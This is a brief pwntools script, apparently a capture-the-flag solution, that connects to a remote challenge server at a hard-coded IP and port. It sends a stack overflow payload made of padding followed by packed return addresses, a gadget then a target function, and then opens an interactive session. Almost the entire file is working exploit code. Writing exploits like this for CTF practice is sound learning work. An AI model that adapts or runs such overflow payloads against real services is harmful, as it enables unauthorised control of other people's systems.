#!/Users/vinnie/CTF/venv/bin/python3
from pwn import log, remote, ELF, p64, context

context.log_level = "debug"
elf = context.binary = ELF('./chall', checksec=False)

# SETUP
conn = remote('34.48.173.44', 5000)

# EXPLOIT HERE
conn.sendline(b'aaaaaaa\x00baaaaaaa' + p64(0x7fffffffe068) + p64(0x40101a) + p64(0x4011f6))

conn.interactive()
conn.close()
